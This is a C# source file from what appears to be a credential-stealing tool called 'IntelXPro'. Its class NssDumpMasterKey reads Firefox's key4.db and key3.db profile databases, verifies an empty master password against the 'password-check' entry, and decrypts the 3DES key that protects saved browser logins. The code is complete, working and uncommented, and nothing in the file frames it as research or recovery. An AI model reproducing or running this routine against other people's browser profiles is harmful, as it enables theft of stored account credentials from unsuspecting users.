using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using IntelXPro.src.IntelXPro.Dependencies.Hashing;
using IntelXPro.src.IntelXPro.Dependencies.Sql;

namespace IntelXPro.src.IntelXPro.Dependencies.Encryption
{
    public class NssDumpMasterKey
    {
        public static byte[] Key4Database(string path)
        {
            Asn1Der asn1Der = new Asn1Der();
            SqLite sqLite = SqLite.ReadTable(path, "metaData");
            if (sqLite == null)
            {
                return null;
            }
            for (int i = 0; i < sqLite.GetRowCount(); i++)
            {
                if (sqLite.GetValue(i, 0) != "password")
                {
                    continue;
                }
                byte[] bytes = Encoding.UTF8.GetBytes(sqLite.GetValue(i, 1));
                byte[] bytes2 = Encoding.UTF8.GetBytes(sqLite.GetValue(i, 2));
                if (bytes.Length < 1 || bytes2.Length < 1)
                {
                    continue;
                }
                Asn1DerObject asn1DerObject = asn1Der.Parse(bytes2);
                string text = asn1DerObject.ToString();
                if (text == null)
                {
                    continue;
                }
                if (text.Contains("2A864886F70D010C050103"))
                {
                    byte[] array = asn1DerObject.Objects[0]?.Objects[0]?.Objects[1]?.Objects[0]?.Data;
                    byte[] array2 = asn1DerObject.Objects[0]?.Objects[1]?.Data;
                    if (array == null || array2 == null)
                    {
                        continue;
                    }
                    byte[] bytes3 = new TripleDes(array2, bytes, new byte[0], array).Compute();
                    if (!Encoding.GetEncoding("ISO-8859-1").GetString(bytes3).StartsWith("password-check"))
                    {
                        continue;
                    }
                }
                else
                {
                    if (!text.Contains("2A864886F70D01050D"))
                    {
                        continue;
                    }
                    byte[] array3 = asn1DerObject.Objects[0]?.Objects[0]?.Objects[1]?.Objects[0]?.Objects[1]?.Objects[0]?.Data;
                    byte[] array4 = asn1DerObject.Objects[0]?.Objects[0]?.Objects[1]?.Objects[2]?.Objects[1]?.Data;
                    byte[] array5 = asn1DerObject.Objects[0]?.Objects[0]?.Objects[1]?.Objects[3]?.Data;
                    if (array3 == null || array4 == null || array5 == null)
                    {
                        continue;
                    }
                    byte[] bytes4 = new PBE(array5, bytes, new byte[0], array3, array4).Compute();
                    if (!Encoding.GetEncoding("ISO-8859-1").GetString(bytes4).StartsWith("password-check"))
                    {
                        continue;
                    }
                }
                sqLite = SqLite.ReadTable(path, "nssPrivate");
                if (sqLite != null)
                {
                    int num = 0;
                    if (num < sqLite.GetRowCount())
                    {
                        byte[] bytes5 = Encoding.UTF8.GetBytes(sqLite.GetValue(num, 6));
                        Asn1DerObject asn1DerObject2 = asn1Der.Parse(bytes5);
                        byte[] sourceArray = new PBE(entrySalt: asn1DerObject2.Objects[0].Objects[0].Objects[1].Objects[0].Objects[1].Objects[0].Data, partIv: asn1DerObject2.Objects[0].Objects[0].Objects[1].Objects[2].Objects[1].Data, ciphertext: asn1DerObject2.Objects[0].Objects[0].Objects[1].Objects[3].Data, globalSalt: bytes, masterPassword: new byte[0]).Compute();
                        byte[] array6 = new byte[24];
                        Array.Copy(sourceArray, array6, array6.Length);
                        return array6;
                    }
                }
            }
            return null;
        }

        public static byte[] Key3Database(string path)
        {
            byte[] array = System.IO.File.ReadAllBytes(path);
            if (array == null)
            {
                return null;
            }
            Asn1Der asn1Der = new Asn1Der();
            BerkeleyDB berkeleyDB = new BerkeleyDB(array);
            string text = berkeleyDB.Keys.Where(delegate (KeyValuePair<string, string> p)
            {
                KeyValuePair<string, string> keyValuePair = p;
                return keyValuePair.Key.Equals("password-check");
            }).Select(delegate (KeyValuePair<string, string> p)
            {
                KeyValuePair<string, string> keyValuePair = p;
                return keyValuePair.Value;
            }).FirstOrDefault();
            if (text == null)
            {
                return null;
            }
            text = text.Replace("-", null);
            int num = int.Parse(text.Substring(2, 2), NumberStyles.HexNumber) * 2;
            string hexString = text.Substring(6, num);
            int num2 = text.Length - (6 + num + 36);
            string hexString2 = text.Substring(6 + num + 4 + num2);
            string text2 = berkeleyDB.Keys.Where(delegate (KeyValuePair<string, string> p)
            {
                KeyValuePair<string, string> keyValuePair = p;
                return keyValuePair.Key.Equals("global-salt");
            }).Select(delegate (KeyValuePair<string, string> p)
            {
                KeyValuePair<string, string> keyValuePair = p;
                return keyValuePair.Value;
            }).FirstOrDefault();
            if (text2 == null)
            {
                return null;
            }
            text2 = text2.Replace("-", null);
            TripleDes tripleDes = new TripleDes(HexToBytes(text2), Encoding.ASCII.GetBytes(""), HexToBytes(hexString));
            tripleDes.ComputeVoid();
            if (!TripleDes.DecryptStringDesCbc(tripleDes.Key, tripleDes.Vector, HexToBytes(hexString2)).StartsWith("password-check"))
            {
                return null;
            }
            string text3 = berkeleyDB.Keys.Where(delegate (KeyValuePair<string, string> p)
            {
                KeyValuePair<string, string> keyValuePair = p;
                if (!keyValuePair.Key.Equals("global-salt"))
                {
                    keyValuePair = p;
                    if (!keyValuePair.Key.Equals("Version"))
                    {
                        keyValuePair = p;
                        return !keyValuePair.Key.Equals("password-check");
                    }
                }
                return false;
            }).Select(delegate (KeyValuePair<string, string> p)
            {
                KeyValuePair<string, string> keyValuePair = p;
                return keyValuePair.Value;
            }).FirstOrDefault();
            if (text3 == null)
            {
                return null;
            }
            text3 = text3.Replace("-", "");
            Asn1DerObject asn1DerObject = asn1Der.Parse(HexToBytes(text3));
            TripleDes tripleDes2 = new TripleDes(HexToBytes(text2), Encoding.ASCII.GetBytes(""), asn1DerObject.Objects[0].Objects[0].Objects[1].Objects[0].Data);
            tripleDes2.ComputeVoid();
            byte[] toParse = TripleDes.DecryptByteDesCbc(tripleDes2.Key, tripleDes2.Vector, asn1DerObject.Objects[0].Objects[1].Data);
            Asn1DerObject asn1DerObject2 = asn1Der.Parse(toParse);
            Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1DerObject2.Objects[0].Objects[2].Data);
            byte[] array2 = new byte[24];
            if (asn1DerObject3.Objects[0].Objects[3].Data.Length > 24)
            {
                Array.Copy(asn1DerObject3.Objects[0].Objects[3].Data, asn1DerObject3.Objects[0].Objects[3].Data.Length - 24, array2, 0, 24);
            }
            else
            {
                array2 = asn1DerObject3.Objects[0].Objects[3].Data;
            }
            return array2;
        }

        public static byte[] HexToBytes(string hexString)
        {
            if (hexString.Length % 2 != 0)
            {
                return null;
            }
            byte[] array = new byte[hexString.Length / 2];
            for (int i = 0; i < array.Length; i++)
            {
                string s = hexString.Substring(i * 2, 2);
                array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
            }
            return array;
        }
    }
}
